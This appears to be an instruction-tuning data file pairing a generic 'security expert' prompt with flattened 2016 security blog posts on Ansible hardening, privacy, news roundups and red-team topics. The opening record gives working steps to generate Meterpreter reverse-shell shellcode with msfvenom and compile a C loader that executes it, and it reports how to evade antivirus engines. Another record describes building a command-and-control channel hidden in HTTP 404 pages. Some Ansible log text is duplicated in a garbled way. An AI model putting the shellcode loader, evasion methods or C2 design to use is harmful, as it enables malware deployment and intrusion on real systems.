computer to execute the code Step-by-Step Instructions First run msfvenom -p windows meterpreter reverse_tcp LHOST LPORT -f c shell_code.c 2 1 Your shell_code.c file should look similar to this Next open up Microsoft Visual Studio If you don't have access to Visual Studio a free copy can be obtained from here by choosing the community edition Now create a new C C empty project and add the following code to a new file include include VirtualAlloc is defined here unsigned const char payload shellcode as output by msfvenom size_t size 0 size of payload in bytes output by msfvenom int main int argc char argv char code Holds a memory address code char VirtualAlloc Allocate a chunk of memory and store the starting address NULL size MEM_COMMIT PAGE_EXECUTE_READWRITE Set the memory to be writable and executable memcpy code payload size Copy our payload into the executable section of memory void code Cast the executable memory to a function pointer and run it return 0 Now set the payload string equal to the contents of buf from the shellcode file and set the size variable equal to the payload size Finally click build in Visual Studio If you wish to compile for 64-bit architectures you must generate 64-bit shellcode with MSFVenom and set the compilation architecture to 64-bit within Visual Studio Shellcode Encoders Beyond changing the stager's architecture and template we can also attempt to disguise the shellcode itself MSFVenom has the ability to obfuscate the stager's shellcode with a reversible cipher using its encoders system This system was originally created in order to handle unsafe characters within the shellcode being processed However when researching AV evasion techniques encoders seem to be a common suggestion While their efficacy is debatable two encoders are in heavy use Shikata Ga Nai for 32-bit shellcode and XOR encoding for 64-bit shellcode What a Handsome Bunch Putting It All Together Now that we have selected our disguises we need to put them to the test First we need to choose which shellcodes we want to disguise Three of the most common shellcodes for Meterpreter stagers are reverse_tcp reverse_http and reverse_https Next we need to identify how many different disguises we want to test We could choose 32-bit or 64-bit to use the default template or a custom template or to encode the shellcode or not All in all this leads to twenty-four different stagers to test After generating all twenty-four stagers and making sure they worked I ran them through Virus Total and plotted the results As you can see moving to a custom template is the most effective disguise However simply changing the targeted architecture to 64-bit thwarts more than half of the tested AV engines When combining the two disguises our malware slips by every single engine tested In the case of 32-bit stagers only a single antivirus engine was able to detect our malware wearing all three disguises Qihoo 360 Even then it was only identified via heuristic as general malware AV evasion goes beyond the techniques discussed in this post For example you can alter the shellcode before it is assembled to machine code you can use different programming languages to create your template and you can use the full breadth of the Veil evasion suite Antivirus is still a helpful tool in a blue teamer's belt but beware antivirus is all but dead for any advanced persistent threat"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Securing Your Way to Restful Sleep with Ansible Galaxy</title>\n<taxonomies>Author, Blue Team, Blue Team Tools, Jordan Drysdale, ansible, Ansible Galaxy, Linux</taxonomies>\n<creation_date>Mon, 11 Jul 2016 19:03:43 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale Life as a 'blue-teamer can often be a stressful experience Working in an environment with a strong Linux infrastructure can help some but Ansible can help immensely In all environments regardless of the operating systems at hand we need to secure remote access to our systems The Ansible Galaxy is full of fun roles that make a blue-teamer's life easier Through Ansible Galaxy we can utilize a few roles to secure a linux server quickly effectively and in a manner that is easy to reproduce When securing remote access key-based SSH and sometimes 2FA can provide an extra layer of relief Additionally it would be hard to imagine dropping one's defenses and going naked so a firewall is a standard requirement Why not throw in fail2ban to defend against attempts to smash through open services with iptables I seriously love this combination of services Oh you tried thrice to authenticate on our HTTPS Fail2ban please jail this IP for a while Thanks mkay And last but not least let's dump all this stuff into logstash Geo-IP map it in Kibana for an awesome visualization and finally get some rest First let's check our ansible version ansible tw17ch01 etc ansible roles sshd dpkg -l grep ansible ii ansible 2.1.0.0-1ppa trusty all A radically simple IT automation platform Next let's install configure and deploy SSHd with a galaxy role that includes every possible variable We are going to add the role make some changes and then later we will build a playbook to deploy our new role Link here alaxy.ansible.com mattwillsher sshd Ansible server magic ansible tw17ch01 etc ansible playbooks sudo ansible-galaxy install mattwillsher.sshd sudo password for ansible downloading role 'sshd owned by mattwillsher downloading role from ithub.com willshersystems ansible-sshd archive v0.4.4.tar.gz extracting mattwillsher.sshd to etc ansible roles mattwillsher.sshd mattwillsher.sshd was installed successfully ansible tw17ch01 etc ansible playbooks sudo mv mattwillsher.sshd sshd Galaxy roles for the most part create a standard structure inside their role directory and if it doesn't exist ansible tw17ch01 etc ansible roles sshd ls CHANGELOG files LICENSE README.md templates Vagrantfile defaults handlers meta tasks tests vars ansible tw17ch01 etc ansible roles sudo nano sshd vars Ubuntu_14.yml Strong recommendation to modify the default port disable root login altogether and add a line for PasswordAuthentication no Ensure the file you modify is appropriate for the OS you are deploying the role to Next let's install configure and deploy a firewall to block all the things Link here alaxy.ansible.com geerlingguy firewall ansible tw17ch01 etc ansible roles sudo ansible-galaxy install geerlingguy.firewall sudo password for ansible downloading role 'firewall owned by geerlingguy downloading role from ithub.com geerlingguy ansible-role-firewall archive 1.0.9.tar.gz extracting geerlingguy.firewall to etc ansible roles geerlingguy.firewall geerlingguy.firewall was installed successfully ansible tw17ch01 etc ansible roles sudo mv geerlingguy.firewall chains Let's make a few edits ansible tw17ch01 etc ansible roles sudo nano chains defaults main.yml The firewall mods were easier to wrap my brain around than the complexity built in to the sshd role My system only needed the above listed SSH port and HTTPS One more mod to the chains role ansible tw17ch01 etc ansible roles sudo nano chains templates firewall.bash.j2 I added the following rule because I don't care about outbound traffic from a DO droplet right now Allow all outbound traffic you can SHOULD modify this to only allow certain traffic iptables -A OUTPUT -j ACCEPT The chains role should be ready to rock Next let's install configure and deploy fail2ban to protect services Link here alaxy.ansible.com tersmitten fail2ban ansible tw17ch01 etc ansible roles sudo ansible-galaxy install tersmitten.fail2ban downloading role 'fail2ban owned by tersmitten downloading role from ithub.com Oefenweb ansible-fail2ban archive v1.5.0.tar.gz extracting tersmitten.fail2ban to etc ansible roles tersmitten.fail2ban tersmitten.fail2ban was installed successfully ansible tw17ch01 etc ansible roles sudo mv tersmitten.fail2ban banner Let's make a few edits ansible tw17ch01 etc ansible roles sudo nano banner defaults main.yml I had to make some changes to my sshd services configuration to reflect the use of a non-standard port I also added service configuration for HTTPS After looking through the rest of the directory structure this role is also ready to go Last let's install configure and deploy filebeat to ship log files to a useful destination Link here alaxy.ansible.com jpnewman elk-filebeat ansible tw17ch01 etc ansible roles sudo ansible-galaxy install jpnewman.elk-filebeat downloading role 'elk-filebeat owned by jpnewman downloading role from ithub.com jpnewman ansible-role-elk-filebeat archive master.tar.gz extracting jpnewman.elk-filebeat to etc ansible roles jpnewman.elk-filebeat jpnewman.elk-filebeat was installed successfully ansible tw17ch01 etc ansible roles sudo mv jpnewman.elk-filebeat logger Finally let's set up TLS shipment of logs across the interwebs for future prospecting inside an existing ELK stack This assumes a bunch of things have already been done 1 Fully operational ELK stack 2 TLS PKI infrastructure in place for logstash and the certificate available for deployment via logger role 3 Port forwarding on network firewall for logstash port 4 Optional redis cluster to handle a large volume of log processing ansible tw17ch01 etc ansible roles sudo nano logger defaults main.yml In here I have modified the elastic and logstash hosts to point to an infrastructure destination Remember the pretty standard directory structure we discussed earlier Yeah copy your logstash-forward.crt file in to roles logger files certs and the playbook intelligence will deliver Here we are again good to go Let's roll and take a look at a few things to make sure it all works ansible tw17ch01 etc ansible roles ls banner chains logger sshd roles all exist gt vi ansible hosts add new host to your ansible hosts file gt ansible dropper ping -m 12.34.56.78 SUCCESS changed false ping pong ansible tw17ch01 etc ansible roles sudo nano playbooks NewDrop.yml roles are awesome invest the time hosts all become yes roles deploy standard SSH config role sshd install iptables role chains add filebeat role logger deploy and configure fail2ban role banner The manual portion of this deployment happens here SSH over to the new droplet and create a sudo user Yes this can be automated and we'll write about that another day another way ssh root NewDropIP useradd ansible -m -s bin bash passwd ansible UNIX Pass UNIX Pass su ansible mkdir .ssh touch .ssh authorized_keys echo ssh-rsa AAAAB3N IClTJ1E1 ansible tw17ch01 .ssh authorized_keys exit visudo add ansible ALL ALL ALL ALL ansible tw17ch01 etc ansible sudo nano hosts add dropper and NewDropIP ansible tw17ch01 etc ansible ansible tw17ch01 etc ansible ansible-playbook playbooks NewDrop.yml -l dropper -u ansible -K SUDO password PLAY all TASK setup The authenticity of host '12.34.56.78 12.34.56.78 can't be established ECDSA key fingerprint is 5f 1f Are you sure you want to continue connecting yes no yes Enter passphrase for key home ansible .ssh id_rsa ok 12.34.56.78 TASK sshd Set OS dependent variables ok 12.34.56.78 item etc ansible roles sshd vars Ubuntu_14.yml TASK sshd OS is supported ok 12.34.56.78 TASK sshd Installed ok 12.34.56.78 item u'openssh-server u'openssh-sftp-server TASK sshd Run directory ok 12.34.56.78 TASK sshd Configuration changed 12.34.56.78 TASK sshd Service enabled and running ok 12.34.56.78 TASK sshd Register that this role has run ok 12.34.56.78 TASK chains Ensure iptables is installed RedHat skipping 12.34.56.78 TASK chains Ensure iptables is installed Debian ok 12.34.56.78 TASK chains Flush iptables the first time playbook runs changed 12.34.56.78 TASK chains Copy firewall script into place changed 12.34.56.78 TASK chains Copy firewall init script into place changed 12.34.56.78 TASK chains Ensure the firewall is enabled and will start on boot changed 12.34.56.78 TASK logger Create directory to store ssl crt changed 12.34.56.78 TASK logger Copy SSL cert changed 12.34.56.78 TASK logger Install Filebeat dependencies ok 12.34.56.78 TASK logger Check if Filebeat is already at the right version changed 12.34.56.78 TASK logger Download Filebeat agent changed 12.34.56.78 TASK logger Install Filebeat agent changed 12.34.56.78 TASK logger Create directory for Filebeat Configures changed 12.34.56.78 TASK logger Create directory for Filebeat Configures changed 12.34.56.78 TASK logger Configure Filebeat changed 12.34.56.78 TASK logger Configure Filebeat prospectors DEPRECATION WARNING Using bare variables is deprecated Update your playbooks Need to clean up this playbook so that the environment value uses the full variable syntax prospectors This feature will be removed in a future release Deprecation warnings can be disabled by setting deprecation_warnings False in ansible.cfg changed 12.34.56.78 item u'paths u'log_paths u var log syslog u var log auth.log u'document_type u'syslog u'type u'syslog u'id u'syslog changed 12.34.56.78 item u'paths u'log_paths u var log .log u'document_type u'log u'exclude_files u syslog In sweet corn bread muffins I'll be dipped heck yes We just rolled out solutions to most everything I or most admins worry about Let's ssh over and take a look around to make sure nothing got bricked and verify that things look good SSH ansible tw17ch03 cat etc ssh sshd_config ansible managed etc ansible roles sshd templates sshd_config.j2 modified on 2016-04-16 12 32 30 by root on tw17ch01 Port 22444 Protocol 2 HostKey etc ssh ssh_host_rsa_key AcceptEnv LANG LC_ ChallengeResponseAuthentication no HostbasedAuthentication no IgnoreRhosts yes KeyRegenerationInterval 3600 LogLevel INFO LoginGraceTime 120 PasswordAuthentication no X11Forwarding yes iptables ansible tw17ch03 sudo iptables -L sudo password for tendans Chain INPUT policy ACCEPT target prot opt source destination ACCEPT all anywhere anywhere ACCEPT tcp anywhere anywhere tcp dpt 22444 ACCEPT tcp anywhere anywhere tcp dpt https ACCEPT icmp anywhere anywhere ACCEPT udp anywhere anywhere udp spt ntp ACCEPT all anywhere anywhere state RELATED ESTABLISHED LOG all anywhere anywhere limit avg 15 min burst 5 LOG level debug prefix Dropped by firewall DROP all anywhere anywhere Chain FORWARD policy ACCEPT target prot opt source destination Chain OUTPUT policy ACCEPT target prot opt source destination ACCEPT all anywhere anywhere ACCEPT udp anywhere anywhere udp dpt ntp FileBeat ansible tw17ch03 cat etc filebeat filebeat.yml Filebeat Configuration Example Filebeat filebeat List of prospectors to fetch data Fail2Ban tendans tw17ch03 cat etc fail2ban jail.local ansible managed etc ansible roles banner templates etc fail2ban jail.local.j2 modified on 2016-05-30 05 57 15 by root on tw17ch01 ssh enabled true port 22444 filter sshd logpath var log auth.log maxretry 6 findtime 600 https enabled true port https filter https logpath var log auth.log maxretry 6 findtime 600 That's it that's all The playbook looks good and the roles all deployed as expected The config files are updated and SSH is allowing us remote access Oh yeah and here is a Kibana visualization of source geo-IP mapping of the remote connections arriving via the packaged logs shipping over from FileBeat and H T to an unnamed colleague cheers u auth.log In sweet corn bread muffins I'll be dipped heck yes We just rolled out solutions to most everything I or most admins worry about Let's ssh over and take a look around to make sure nothing got bricked and verify that things look good SSH That's it that's all The playbook looks good and the roles all deployed as expected The config files are updated and SSH is allowing us remote access Oh yeah and here is a Kibana visualization of source geo-IP mapping of the remote connections arriving via the packaged logs shipping over from FileBeat and H T to an unnamed colleague cheers u filebeat.log In sweet corn bread muffins I'll be dipped heck yes We just rolled out solutions to most everything I or most admins worry about Let's ssh over and take a look around to make sure nothing got bricked and verify that things look good SSH That's it that's all The playbook looks good and the roles all deployed as expected The config files are updated and SSH is allowing us remote access Oh yeah and here is a Kibana visualization of source geo-IP mapping of the remote connections arriving via the packaged logs shipping over from FileBeat and H T to an unnamed colleague cheers u topbeat.log In sweet corn bread muffins I'll be dipped heck yes We just rolled out solutions to most everything I or most admins worry about Let's ssh over and take a look around to make sure nothing got bricked and verify that things look good SSH That's it that's all The playbook looks good and the roles all deployed as expected The config files are updated and SSH is allowing us remote access Oh yeah and here is a Kibana visualization of source geo-IP mapping of the remote connections arriving via the packaged logs shipping over from FileBeat and H T to an unnamed colleague cheers u'id u'varlog TASK logger Start Filebeat changed 12.34.56.78 TASK banner install changed 12.34.56.78 item u'fail2ban TASK banner update configuration file etc fail2ban fail2ban.conf changed 12.34.56.78 TASK banner update configuration file etc fail2ban jail.local changed 12.34.56.78 TASK banner copy filters skipping 12.34.56.78 TASK banner copy actions skipping 12.34.56.78 TASK banner copy jails skipping 12.34.56.78 TASK banner start and enable service ok 12.34.56.78 RUNNING HANDLER sshd reload_sshd changed 12.34.56.78 RUNNING HANDLER chains restart firewall changed 12.34.56.78 RUNNING HANDLER logger restart filebeat changed 12.34.56.78 RUNNING HANDLER banner restart fail2ban changed 12.34.56.78 PLAY RECAP 12.34.56.78 ok 32 changed 22 unreachable 0 failed 0 In sweet corn bread muffins I'll be dipped heck yes We just rolled out solutions to most everything I or most admins worry about Let's ssh over and take a look around to make sure nothing got bricked and verify that things look good SSH That's it that's all The playbook looks good and the roles all deployed as expected The config files are updated and SSH is allowing us remote access Oh yeah and here is a Kibana visualization of source geo-IP mapping of the remote connections arriving via the packaged logs shipping over from FileBeat and H T to an unnamed colleague cheers"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Get to Know a Tester: Sally</title>\n<taxonomies>Fun & Games</taxonomies>\n<creation_date>Wed, 13 Jul 2016 17:15:56 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Note A few months ago we did a short interview with a tester when we talked to Ethan This month we had a conversation with Sally Vandeven who's only been with us just under a year but already feels like an old friend Enjoy Sierra outu.be usm7EWOOfiw"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Lawrence's List 071516</title>\n<taxonomies>News, AWS, BSidesPhilly, Linus, Linux, MIT, printer attacks, printer drivers, Riffle</taxonomies>\n<creation_date>Fri, 15 Jul 2016 17:41:12 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Lawrence Hoffman Hey I'm back Vacation was great I spent part of last week on an Island so I was unable to scratch the keep-up-with-the-media itch Now that I'm back I put aside a little time to try and catch up and get a list gathered together of stuff I saw this week The printer watering hole attack If you have twitter and follow any security folks at all you've probably heard of this attack Essentially people want to be able to access printers without needing to contact a systems administrator For this reason there is an exception to policy which allows installation of printer specific drivers as system without any warnings This is hacker paydirt Read about it here log.vectranetworks.com blog microsoft-windows-printer-wateringhole-attack MIT had a great writeup on Riffle this week along with the research paper describing the protocol We've seen several times that TOR has some weaknesses as does every system that's important to remember and MIT has a possible alternative The approach is centered around a concept of shuffling the traffic in a way that's mathematically provable to the receiving client Without breaking into pure mathematics let's put it like this as long as one server in the mixnet remains uncompromised the users remain anonymous ews.mit.edu 2016 stay-anonymous-online-0711 AWS security is something I've been looking after for a while now as I have some future work planned in the cloud I managed to type that without cursing and to that end there's this neat series of articles about persistence in a hacked AWS account anielgrzelak.com disrupting-aws-logging-a42e437d6594 .pfrt7rbc4 anielgrzelak.com exploring-an-aws-account-after-pwning-it-ff629c2aae39 .ns0wk01r4 anielgrzelak.com backdooring-an-aws-account-da007d36f8f9 .5ws8kwr8o BSides Philly Call for Papers So this isn't so much news the CFPs for BSides happen all the time because there are a lot of BSides conferences Why am I mentioning it here Because I've now been to a few BSides conferences and can give my stamp of approval I really like the way that a BSides conference works They happen all over so you can catch one close to you the talks at the BSides I've been to have been outstanding I also think it's a great place to start if you're interested in giving a talk about something you've been researching there's a much better chance you'll get in with a BSides than with many of the other conferences ww.bsidesphilly.org cfp Linus is in the news for cursing again I'm a programmer I get it things like the format of comments and the way we name our variables are something most of us hold very strong opinions about To offer another perspective to those who believe that Linux is just being abusive here think of it like this when someone writes code for the Linux Kernel it has to be reviewed sometimes by dozens of people It will also have to be maintained sometimes for decades It may also have to one day be abstracted extended replicated or generalized When writing code we know that the compiler doesn't care what the comments look like we write those for the dozens of people who are stuck reading that code Linus spends lots of time reading others code For those of you who must read the rant kml.iu.edu hypermail linux kernel 1607.1 00627.html"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Data Mining & Privacy: How Anonymous Are You Really?</title>\n<taxonomies>InfoSec 201, anonymization, aol, data mining, facial recognition, netflix, personal data, pokemon go, privacy, social security</taxonomies>\n<creation_date>Mon, 18 Jul 2016 16:31:52 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Sam Carroll When I started at BHIS I was surprised at the sensitivity of personal data such as my birthday I was soon reminded of a data mining class I took last year where Dr Karlsson South Dakota School of Mines Technology started with an ethics portion Specifically the ethics he warned us about was anonymization of users data and re-identification of personal data Sensitive information that has been poorly obfuscated can be reversed to discover very specific information about individuals This has been such a big concern for individuals and corporations since 1998 when GeoCities had told customers information would not be shared but then sold the data to third parties The FCC ruled that companies must not lie about their privacy policies Think about how many companies have you agree to a privacy policy and sometimes due to bad anonymization sensitive information can leak out One of the most egregious example is from the early 90's when Latanya Sweeney discovered that about 90 of the US population could be uniquely identified by their zip code birthdate and sex To prove this point Sweeney bought voter rolls public record and combined it with data from GIC a health insurance purchaser for state employees Though GIC had removed names SSN's and home addresses Sweeney was able to identify the governor's health records including prescriptions who personally vouched for the security of the anonymization Though this incident of health care re-identification was 'contained to Massachusetts reidentification is a problem that affects just about everyone including tech giants 2006 had two famous examples of breach of privacy of two well known companies Netflix and AOL Netflix announced a competition to beat their suggestion algorithm so people could train and test their solutions Netflix removed the usernames of 500 000 users from their ratings but gave unique identifiers in the place of usernames In a study conducted on this data researchers coupled ratings on IMDB that had usernames associated with the IMDB profile with the Netflix database and just 6 movie ratings nearly all users in Netflix's database were discovered AOL similarly released tens of millions of search queries from a 3 month time span and anonymized the data by removing usernames and IP Addresses and again gave unique identifiers for each user meaning each user was still uniquely marked but not immediately identifiable Using this data researchers were able to combine the searches for a single user and discover personal information about them using all their searches such as how is the weather in New York City what's fun for a 18 year old to do on Saturday searching their own name or SSN's Thus giving anyone who is interested and committed enough personal information that should be left undisclosed Some of the information included things of a more private nature such as how to come out as an abuse victim to your family or how to get out of an abusive relationship In 2009 Carnegie Mellon discovered a way to analyze data to discover the SSN of an individual They did this using only the birth location as SSN's use physical location as the first 5 numbers The last four numbers were reduced to only 1000 combinations and they reduced this by using public death records that record SSN's to find a pattern of the last 4 digits with high correlation to birthdate Thus with only two little pieces of information both of which are pretty much provided by any social networking website and a little work it's relatively easy to uncover an individual's social security number Congress passed a bill last week that allows the government and commercial operators of drones to collect potentially personally identifiable data about individuals including facial recognition without disclosing it Also this bill did not include provisions on how they would use the data and if when it would be destroyed showing that we still face concerns over our privacy Pokemon Go even had a terrible breach of privacy on the iOS version of the app which originally required rights to a user's entire Gmail account Some even went as far to say this included the ability to send emails read calendar events access contacts and photos Though developer Niantic says no information was gathered one thing is clear Privacy is not a growing concern You must be be careful about what you share even with Pokemon Be careful what you share the most insidious and perhaps one of the best ways to extract personal information is to ask for it People are very careful about what they know will compromise them but the data that they feel won't compromise them they are freely willing to distribute However even professionals will sometimes fail to keep data truly anonymous and sometimes deeply embarrassing or highly private data can be compromised because of it Assume you're already compromised and take provisions to stay secure Sources igital.law.washington.edu dspace-law bitstream handle 1773.1 417 vol5_no1_art3.pdf pic.org privacy reidentification process www.nytimes.com 2016 07 14 technology personaltech how-to-protect-privacy-while-using-pokemon-go-and-other-apps.html www.computerworld.com article 3095491 robotics faa-compromise-bill-drops-key-drone-privacy-provisions.html"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Build a 404 page not found C2</title>\n<taxonomies>C2, Red Team, building, C2, http 404, network traffic</taxonomies>\n<creation_date>Wed, 20 Jul 2016 18:37:23 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "A Guest blog by Matthew Pawelski A C2 or command-and-control is used by attackers to control compromised systems Most of these C2s are in control of large botnets yet some are simply used by an attacker to have access to a system so they can pivot to another device or to steal credentials and gain legitimate access to the system I have seen and heard of many types of C2s out there such as IRC p2p DNS Twitter Gmail ICMP and etc This list keeps getting bigger and the ways C2 are implemented get more inventive everyday I am rarely ever surprised by any new C2 I hear about Though one day having a conversation with John Strand he mentioned a C2 that uses an HTTP 404 File Not Found This got my attention As a security professional most of these techniques but not all are fairly easily detected and stopped Though the HTTP 404 File Not Found would be a little more difficult to detect filtering blocking HTTP 404 File Not Found altogether would be easy to stop But how many environments block HTTP 404 If fact how many environments out there monitor and view website HTTP 404 If you are like me when looking through network traffic HTTP 404 is generally overlooked or skipped When combing through traffic I am mostly looking for any anomalies in the traffic traffic going to odd places on the Internet or other things of that nature With my interest piqued I started to do a little research to see if anyone has used this attack and if anyone has detected this type of C2 in the wild I found a couple of writings one a Black Hat white paper titled Hiding in Plain Sight by Pierre-Marc Bureau and Christian Dietrich ww.blackhat.com docs eu-15 materials eu-15-Bureau-Hiding-In-Plain-Sight-Advances-In-Malware-Covert-Communication-Channels-wp.pdf and another one Hiding Malicious Traffic Under the HTTP 404 Error by He Xu log.fortinet.com 2015 04 09 hiding-malicious-traffic-under-the-http-404-error The Black Hat white paper references the Fortinet paper by He Xu and I used the Fortinet paper to model my proof of concept In the article by He Xu they actually detected and witnessed the HTTP 404 File Not Found C2 and the article covers what they found and what was happening Basically an infected device would reach out to this web server but would get back a HTTP 404 File Not Found The HTTP 404 seemed benign however a comment on the source page had base64-encoded commands These commands were instructions for the bot to replicate itself to USB drives download and execute an executable and finally to change some registry keys Based on this article and the way the bot acted I decided to create my own HTTP 404 File Not Found C2 Though instead of just having the compromised system get a command and run those instructions I wanted it to be able to control and get a response from a system via the HTTP 404 File Not Found The first part was setting up the web server by adding and configuring the .htaccess file to direct any error pages to a .html file of my choosing below I redirect it to evil.html As an attacker this web server could be one they setup and control directly or a server they have access to Once the site was setup and the HTTP 404 File Not Found was setup and working I moved on to part 2 the C2 server This was the easiest part of code The code would wait for me to input a command that I wanted to give to a controlled device base64 encode it put it in an html comment with a predefined header and wrap it into an html file It would then overwrite the current HTTP 404 File Not Found html file This would overwrite the HTTP 404 File Not Found file only when I entered a new command For my testing I setup and controlled the web server though if it was a compromised server I could have easily used FTP to upload new html files The next step was to create the C2 client A few things I wanted from the client the ability to control the client with commands that would work for both windows and Linux and a response from the commands back to a listening server The client had to reach out to a domain I used a static URL but this could easily be changed to ask for a random page Once it requested a page from the site it would first determine if it was a 404 page If it was not a 404 page then ignore and wait until the next request goes out If it is a 404 page not found then check to see if it has comments in the source code If it finds comments then check to see if the header in the comments matches a predefined header If the header matches then decode the base64 string and execute the command s This part of the code was a little more difficult as I wanted to not only execute commands on the client system I also wanted to be able to give basic commands to Linux and windows alike Then finally I needed to send the results of the executed command s back to a server What I did to fix this on the C2 client was to determine if the compromised system was Linux or Windows If the system was Linux then execute the commands as if the OS was Windows then execute it as a PowerShell script re-encoded in base64 Using PowerShell for the Windows OS would give some of the same basic commands as it would in Linux The final part of the C2 client then would send the results of the commands back to a listening server I chose for testing a python server for a listener The way you send the commands back could be more elaborate to bypass egress filtering and packet filtering But for simplicity and ease I just used a python server listener Finally I created the C2 receiver for the results for the commands sent by the C2 client This was just a basic python server that is waiting for a connection For my demo I am using a Windows 10 machine as the victim and an Ubuntu desktop as the web server the C2 controller and the C2 receiver You can see the website is an Office 365 login page Though once I go to a page that does not exist I should get a 404 error And you will notice that the source page does not have any comments just a basic web page The C2 Server starts and waits for a command The C2 command receiver opens a port and waits for an incoming connection The C2 client is then run on the victim machine not much to see the file starts then runs in the background Now we can do a simple command such as ls As you can see the client sends the contents of the Desktop where the program was running from back to the receiver I will create a file list the contents and then show 404 page and source code of the page From the C2 server I am able to run commands I used a PowerShell command and created an empty file in the current directory desktop The C2 receiver shows that the file was created You can now see the file I created from the C2 server is pictured on the desktop The 404 page still looks the same But if you look at the source code you can see that there is a new comment at the bottom of the page And if you decode TmV3LUl0ZW0gLU5hbWUgRW1wdHlGaWxlLnR4dCAtSXRlbVR5cGUgRmlsZQ You get New-Item -Name EmptyFile.txt -ItemType File In conclusion this could be a very powerful tool and easily overlooked It was a fun little project and you can see the source code at ithub.com theG3ist foOhfo OK the real site is ithub.com theG3ist 404"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Lawrence's List 072216</title>\n<taxonomies>News, canonical, Digital Millennium Copyright Act, free wifi, long passwords, opensshd, snark</taxonomies>\n<creation_date>Fri, 22 Jul 2016 17:24:09 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Lawrence Hoffman The list this week is a little shorter I didn't include a tool or POC link as I usually do No particular reason just didn't run across one I felt like I could talk about directly Among the articles this week we see legal actions leaked data an openssh user enumeration and finally a goofy but serious look at a common security fear open wireless networks The EFF have announced a lawsuit against the United States Government which challenges section 1201 of the Digital Millennium Copyright Act Section 1201 is titled Circumvention of copyright protection systems and was ostensibly originally designed to protect copyrighted media like movies and music The reality of section 1201 is that it takes from consumers their rights to fair use of the media software and hardware which they've purchased For those of you who do not wish to read 1201 though I recommend you do there's a good example of how this is stifling innovation in the EFFs article linked below ww.eff.org press releases eff-lawsuit-takes-dmca-section-1201-research-and-technology-restrictions-violate Canonical reported on the 15th of this month that its forums were again compromised The attacker had access to over two million usernames email address and IP addresses Canonical maintains that due to its use of single sign on the attackers did not obtain any passwords nsights.ubuntu.com 2016 07 15 notice-of-security-breach-on-ubuntu-forums A user enumeration was released for opensshd which allows user enumeration via an interesting sort of timing attack Long passwords 10k are sent to the server and the time that it takes the server to respond to these passwords is then observed For existing users the password will take longer to hash so long as the server is configured to use SHA256 SHA512 for password hashing Also of interest the root user will not appear to be a valid user if root login is not permitted on the server eclists.org fulldisclosure 2016 Jul 51 Voting with your insecure wifi I like theregister.co.uk for snark and this is research that is best reported on with some snarkiness Really I'm posting this because I feel like it's a good indicator for how educated or uneducated as the case may be Americans are about the risks associated with open wifi networks ww.theregister.co.uk 2016 07 21 gop_wifi_privacy_fail"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>The Courage to be Vulnerable: An Ode to Rita</title>\n<taxonomies>InfoSec 101, Don't wait to say nice things to people you love, Office Mom</taxonomies>\n<creation_date>Tue, 26 Jul 2016 16:16:26 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
